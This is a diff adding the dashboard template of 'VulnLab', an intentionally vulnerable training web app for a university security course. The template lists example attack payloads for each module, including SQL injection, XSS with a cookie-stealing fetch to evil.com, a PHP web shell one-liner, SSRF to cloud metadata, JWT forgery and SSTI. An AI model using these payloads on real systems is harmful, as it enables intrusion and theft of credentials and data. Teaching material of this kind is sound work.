@@ -1,0 +1,201 @@
+{% extends "base.html" %}
+{% block title %}Dashboard{% endblock %}
+{% block content %}
+
+<div style="margin-bottom:2rem;">
+  <div style="display:flex;align-items:center;gap:1rem;margin-bottom:0.5rem;">
+    <h1 class="page-title" style="margin:0;">VulnLab</h1>
+    <span class="tag tag-red" style="font-size:11px;letter-spacing:1px;">INTENTIONALLY VULNERABLE</span>
+  </div>
+  <p class="page-subtitle">Web Application Security Demo Platform — for educational use only. Built for the University Cybersecurity Program.</p>
+</div>
+
+<!-- Stats bar -->
+<div class="grid-3" style="margin-bottom:2rem;">
+  <div class="card" style="text-align:center;padding:1rem;border-color:rgba(255,71,87,0.3);">
+    <div style="font-size:2rem;font-weight:800;color:var(--red);font-family:var(--font-head);">14</div>
+    <div style="font-size:11px;color:var(--gray);margin-top:0.25rem;">VULNERABILITY MODULES</div>
+  </div>
+  <div class="card" style="text-align:center;padding:1rem;border-color:rgba(57,211,83,0.3);">
+    <div style="font-size:2rem;font-weight:800;color:var(--green);font-family:var(--font-head);">2×</div>
+    <div style="font-size:11px;color:var(--gray);margin-top:0.25rem;">VULN + SAFE MODE EVERY MODULE</div>
+  </div>
+  <div class="card" style="text-align:center;padding:1rem;border-color:rgba(30,144,255,0.3);">
+    <div style="font-size:2rem;font-weight:800;color:var(--blue);font-family:var(--font-head);">OWASP</div>
+    <div style="font-size:11px;color:var(--gray);margin-top:0.25rem;">TOP 10 ALIGNED</div>
+  </div>
+</div>
+
+<!-- Module grid -->
+{% set modules = [
+  {
+    "title": "SQL Injection — Auth Bypass",
+    "owasp": "A03:2021", "sev": "CRITICAL", "sev_color": "red",
+    "desc": "Login form vulnerable to ' OR '1'='1 and auth bypass via string concatenation.",
+    "payloads": ["' OR '1'='1", "admin'--", "' UNION SELECT ..."],
+    "url": "/sqli/login",
+    "icon": "⚡"
+  },
+  {
+    "title": "SQL Injection — UNION Extract",
+    "owasp": "A03:2021", "sev": "CRITICAL", "sev_color": "red",
+    "desc": "Search bar vulnerable to UNION-based extraction of users table.",
+    "payloads": ["' UNION SELECT NULL,username,password FROM users--", "' ORDER BY 3--"],
+    "url": "/sqli/search",
+    "icon": "⚡"
+  },
+  {
+    "title": "XSS — Reflected",
+    "owasp": "A03:2021", "sev": "CRITICAL", "sev_color": "red",
+    "desc": "Search query reflected in response without encoding. Script executes in browser.",
+    "payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert(document.cookie)>"],
+    "url": "/xss/reflected",
+    "icon": "💉"
+  },
+  {
+    "title": "XSS — Stored",
+    "owasp": "A03:2021", "sev": "CRITICAL", "sev_color": "red",
+    "desc": "Comment body saved to DB and rendered raw — fires on every pageview.",
+    "payloads": ["<script>fetch('//evil.com?c='+document.cookie)</script>", "<svg onload=alert(1)>"],
+    "url": "/xss/stored",
+    "icon": "💉"
+  },
+  {
+    "title": "IDOR — Profile & Orders",
+    "owasp": "A01:2021", "sev": "CRITICAL", "sev_color": "red",
+    "desc": "Change ?id= to access other users' profiles, emails, SSNs and orders.",
+    "payloads": ["/idor/profile?id=1 (admin)", "/idor/orders?user_id=3"],
+    "url": "/idor/profile",
+    "icon": "🔓"
+  },
+  {
+    "title": "CSRF — Fund Transfer",
+    "owasp": "A01:2021", "sev": "HIGH", "sev_color": "yellow",
+    "desc": "Transfer form has no CSRF token — any site can trigger a transfer on behalf of the victim.",
+    "payloads": ["<form action=/csrf/transfer method=POST>...", "Auto-submit on page load"],
+    "url": "/csrf/transfer",
+    "icon": "🎭"
+  },
+  {
+    "title": "File Upload → Web Shell",
+    "owasp": "A03:2021", "sev": "CRITICAL", "sev_color": "red",
+    "desc": "Upload shell.php — no extension or magic byte validation. Served directly from disk.",
+    "payloads": ["shell.php", "shell.php.jpg", "<?php system($_GET['cmd']); ?>"],
+    "url": "/upload",
+    "icon": "📎"
+  },
+  {
+    "title": "SSRF — Server-Side Request Forgery",
+    "owasp": "A10:2021", "sev": "HIGH", "sev_color": "yellow",
+    "desc": "URL fetch feature fetches any URL — including cloud metadata and internal services.",
+    "payloads": ["http://169.254.169.254/latest/meta-data/", "http://localhost:6379"],
+    "url": "/ssrf/fetch",
+    "icon": "🌐"
+  },
+  {
+    "title": "JWT — None Algorithm & Weak Secret",
+    "owasp": "A07:2021", "sev": "HIGH", "sev_color": "yellow",
+    "desc": "Server accepts alg:none JWT without signature. Also uses crackable 'weak' HMAC secret.",
+    "payloads": ["{\"alg\":\"none\"} + empty signature", "hashcat -m 16500 token.txt wordlist.txt"],
+    "url": "/jwt/login",
+    "icon": "🔑"
+  },
+  {
+    "title": "SSTI — Jinja2 Template Injection",
+    "owasp": "A03:2021", "sev": "CRITICAL", "sev_color": "red",
+    "desc": "User input rendered directly as Jinja2 template. Escalates to RCE.",
+    "payloads": ["{{7*7}}", "{{config.items()}}", "{{''.__class__.__mro__}}"],
+    "url": "/ssti",
+    "icon": "🔥"
+  },
+  {
+    "title": "Open Redirect",
+    "owasp": "A01:2021", "sev": "MEDIUM", "sev_color": "blue",
+    "desc": "?url= parameter redirects to any domain — used for phishing and OAuth token theft.",
+    "payloads": ["/redirect?url=https://evil.com", "Used in phishing: legit.com/redirect?url=evil"],
+    "url": "/redirect/demo",
+    "icon": "↪️"
+  },
+  {
+    "title": "Security Headers — Missing",
+    "owasp": "A05:2021", "sev": "HIGH", "sev_color": "yellow",
+    "desc": "Compares response headers in vuln vs safe mode. No CSP, no HSTS, no X-Frame.",
+    "payloads": ["curl -I http://localhost:5000/headers", "Check: securityheaders.com"],
+    "url": "/headers",
+    "icon": "🛡️"
+  },
+  {
+    "title": "Business Logic — Price Tampering",
+    "owasp": "A04:2021", "sev": "HIGH", "sev_color": "yellow",
+    "desc": "Checkout trusts client-supplied price. Change price to 0.01 in Burp and buy a laptop.",
+    "payloads": ["price=0.01", "quantity=-1 (negative qty)", "price=-100 (refund exploit)"],
+    "url": "/logic/checkout",
+    "icon": "🧮"
+  },
+  {
+    "title": "API — Excessive Data Exposure",
+    "owasp": "A05:2021", "sev": "HIGH", "sev_color": "yellow",
+    "desc": "GET /api/users returns all users including passwords, SSNs, addresses — no auth.",
+    "payloads": ["GET /api/users", "GET /api/message/1 (IDOR in API)"],
+    "url": "/api/users",
+    "icon": "📡"
+  }
+] %}
+
+<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:1rem;">
+{% for m in modules %}
+<div class="card" style="border-color:rgba({% if m.sev_color == 'red' %}255,71,87{% elif m.sev_color == 'yellow' %}255,165,2{% else %}30,144,255{% endif %},0.25);padding:1.25rem;transition:border-color 0.2s,transform 0.15s;cursor:pointer;" onclick="window.location='{{ m.url }}'">
+  <div style="display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:0.75rem;">
+    <div style="display:flex;align-items:center;gap:0.6rem;">
+      <span style="font-size:1.2rem;">{{ m.icon }}</span>
+      <div>
+        <div style="font-weight:700;font-size:13px;color:var(--white);line-height:1.3;">{{ m.title }}</div>
+        <div style="font-size:10px;color:var(--gray);margin-top:1px;">{{ m.owasp }}</div>
+      </div>
+    </div>
+    <span class="tag tag-{{ m.sev_color }}" style="flex-shrink:0;">{{ m.sev }}</span>
+  </div>
+  <p style="font-size:12px;color:var(--gray);margin-bottom:0.75rem;line-height:1.5;">{{ m.desc }}</p>
+  <div style="display:flex;flex-wrap:wrap;gap:0.35rem;">
+    {% for p in m.payloads %}
+    <code style="font-size:10px;background:#010409;color:var(--green);padding:2px 7px;border-radius:3px;border:1px solid var(--green2);">{{ p }}</code>
+    {% endfor %}
+  </div>
+  <div style="display:flex;gap:0.5rem;margin-top:1rem;">
+    <a href="{{ m.url }}?safe=0" class="btn btn-red" style="font-size:11px;padding:0.3rem 0.7rem;">⚠ Vulnerable</a>
+    <a href="{{ m.url }}?safe=1" class="btn btn-green" style="font-size:11px;padding:0.3rem 0.7rem;">✓ Patched</a>
+  </div>
+</div>
+{% endfor %}
+</div>
+
+<!-- Credentials hint -->
+<div class="card" style="margin-top:2rem;border-color:rgba(57,211,83,0.2);">
+  <div class="card-header">
+    <span>🔐</span>
+    <span class="card-title" style="font-size:1rem;">Test Credentials</span>
+  </div>
+  <div class="grid-2" style="gap:1rem;">
+    <div>
+      <table class="table">
+        <thead><tr><th>Username</th><th>Password</th><th>Role</th></tr></thead>
+        <tbody>
+          <tr><td><code style="color:var(--red);">admin</code></td><td><code>admin123</code></td><td><span class="tag tag-red">admin</span></td></tr>
+          <tr><td><code style="color:var(--green);">alice</code></td><td><code>password1</code></td><td><span class="tag tag-green">user</span></td></tr>
+          <tr><td><code style="color:var(--green);">bob</code></td><td><code>bob123</code></td><td><span class="tag tag-green">user</span></td></tr>
+          <tr><td><code style="color:var(--green);">charlie</code></td><td><code>charlie456</code></td><td><span class="tag tag-green">user</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div style="font-size:12px;color:var(--gray);line-height:1.8;">
+      <div style="color:var(--yellow);font-weight:600;margin-bottom:0.5rem;">⚡ Quick Tips</div>
+      <div>→ Each module has <code style="color:var(--green);">?safe=0</code> (vuln) and <code style="color:var(--green);">?safe=1</code> (patched)</div>
+      <div>→ Use Burp Suite proxy on <code style="color:var(--green);">127.0.0.1:8080</code> to intercept</div>
+      <div>→ IDOR: login as alice (id=2), then try <code style="color:var(--green);">?id=1</code></div>
+      <div>→ SQLi bypass: <code style="color:var(--red);">' OR '1'='1</code> in the username field</div>
+      <div>→ SSTI: try <code style="color:var(--red);">{{"{{"}}7*7{{"}}"}}</code> in the name parameter</div>
+    </div>
+  </div>
+</div>
+
+{% endblock %}
